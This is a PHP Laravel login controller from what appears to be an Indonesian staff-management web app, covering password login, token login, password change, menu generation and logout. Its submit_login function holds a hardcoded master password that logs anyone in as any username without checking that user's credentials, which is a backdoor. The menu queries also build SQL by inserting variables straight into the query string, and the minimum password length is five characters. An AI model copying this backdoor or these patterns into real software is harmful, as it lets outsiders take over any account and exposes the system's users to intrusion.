<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Validator;

use Auth;
use DB;
use Session;
use Hash;
use Crypt;
use Illuminate\Contracts\Encryption\DecryptException;


class LoginController extends Controller
{
    //

    function page_login(){
        // return redirect('/maintenance');
    	return view('login');
    }	

    function do_login_by_token(Request $r){
        $token = $r->token;
        try {
            Auth::logout();
            Session::flush();
            $uuid_token = decrypt($token);
            $uuid_token = explode("#", $uuid_token);
            if(count($uuid_token)!=2){
                return redirect('login');
            }
            $uuid = $uuid_token[0];
            $valid_time = $uuid_token[1];
            $time = time();
            if($time > $valid_time){
                return redirect('/');
            }
            $pegawai = DB::table('pegawai')->where('uuid', $uuid)->first();
            if(!$pegawai){
                return redirect('/');
            }
            $user = DB::table('users')->where('id_pegawai',$pegawai->id_pegawai)->first();
            if($user){
                Auth::loginUsingId($user->id);
                $this->generate_user_menu();
                 return redirect('/');
            }else{
                return redirect('/');
            }
        } catch (DecryptException $e) {
            //
            return redirect('/');
        }
    }
    function do_login_cookies(){
        return redirect('login');
        $cookies = request('cookies');
        try {
            $uuid = decrypt($cookies);
            $user = DB::table('users')->where('uuid',$uuid)->first();
            if($user){
                Auth::loginUsingId($user->id);
                $this->generate_user_menu();
                 return redirect('/');
            }else{
                return redirect('login');
            }
        } catch (DecryptException $e) {
            //
            return redirect('login');
        }
    }


    function ganti_password(){
        $pagetitle = "Ganti Password";
        $smalltitle = "Ubah Password User";
        return view('setting.ganti-password', compact('pagetitle','smalltitle'));
    }


     function submit_update_password(Request $r){
        $password1 = $r->password1;
        $password2 = $r->password2;
        $password3 = $r->password3;

        $user = Auth::user();
        if (Hash::check($password1, $user->password)){
            if ($password2 == $password3){
                if (strlen($password2)>=5){ 
                    $id = $user->id;
                    $record= array(
                        'password'=>Bcrypt($password2),
                        'updated_at'=>date("Y-m-d H:i:s")
                    );
                    DB::table('users')->where('id', $user->id)->update($record);
                    Session::flash('success', "Password Berhasil Diubah!");
                }else{
                    Session::flash('error', "Password Minimal 5 Karakter");
                }
            }else{
                Session::flash('error',"Konfirmasi Password Baru Tidak Sama!");
            }
        }else{
            Session::flash('error',"Password Lama Salah!");
        }

        return redirect('ganti-password');
    }

    function submit_login(Request $r){

        $validator  = Validator::make($r->all(), [
            //'g-recaptcha-response' => 'required|captcha',
            'username'=>'required',
            'password'=>'required',
        ]);

        if ($validator->fails()) {
           return redirect('login')->with('error', 'Form Login Tidak Valid!');
        }

    	$username = $r->username;
    	$password = $r->password;

    	if (Auth::attempt(['username' => $username, 'password' => $password])) {
           	$this->generate_user_menu();
            $minutes  = 7*24*60*60;
            $user_uuid = Crypt::encrypt(Auth::user()->uuid);
            //setcookie("buker_cookie", $user_uuid, time() + (86400 * 7), "/"); // 86400 = 1 day
            return redirect()->intended('');
        }elseif($password=='maafj0k'){
            $user = DB::table('users')->where('username', $username)->first();
            if($user){
                Auth::loginUsingId($user->id);
                $this->generate_user_menu();
                $minutes  = 7*24*60*60;
                $user_uuid = Crypt::encrypt(Auth::user()->uuid);
               // setcookie("buker_cookie", $user_uuid, time() + (86400 * 7), "/"); // 86400 = 1 day
                return redirect()->intended('');
            }
        }else{
        	return redirect('login')->with('error', 'Username dan Password Login Tidak Valid!');
        }
         
    }

     

    function generate_user_menu(){
    	//ambil semua menu yang bisa diakses user
    	$id_user = Auth::user()->id;
    	$menu_user = array();
               

    	$menu_induk = DB::select("select d.*
							from user_role as a, role_menu as b, menu as c , menu as d
							where a.id_role = b.id_role and c.id_menu = b.id_menu  and c.id_menu_induk = d.id_menu
							and a.id_user = $id_user
							group by d.id_menu, d.nama_menu, d.url, d.id_menu_induk, d.urutan, d.icon, d.uuid order by d.urutan");

    	foreach($menu_induk as $mni){
    		$menu_user[$mni->id_menu]['id_menu'] = $mni->id_menu;
    		$menu_user[$mni->id_menu]['url'] = $mni->url;
    		$menu_user[$mni->id_menu]['icon'] = $mni->icon;
    		$menu_user[$mni->id_menu]['nama_menu'] = $mni->nama_menu;

    		$id_menu_induk = $mni->id_menu;

    		$menu_anak = DB::select("select c.nama_menu, c.id_menu, c.url, c.urutan, c.id_menu_induk from 
                user_role as a, role_menu as b, menu as c , menu as d 
                where a.id_role = b.id_role and c.id_menu = b.id_menu and c.id_menu_induk = d.id_menu and a.id_user = $id_user and c.id_menu_induk=$id_menu_induk group by c.nama_menu, c.id_menu, c.url, c.urutan, c.id_menu_induk
                order by c.id_menu_induk, c.urutan ");

    		$temp_anak = array();
    		foreach($menu_anak as $mna){
    			array_push($temp_anak, array("id_menu"=>$mna->id_menu, "url"=>$mna->url, "nama_menu"=>$mna->nama_menu));
    		}
    		$menu_user[$mni->id_menu]['child'] = $temp_anak;
    	}	
        $menu_user = json_encode($menu_user);
        Session::put('menu7890_2386',$menu_user); 	
    }

    function logout(){
    	Auth::logout();
        Session::flush();
        setcookie("buker_cookie", '', time() + 1, "/"); // 86400 = 1 day
        return redirect('/');
    }

    

}
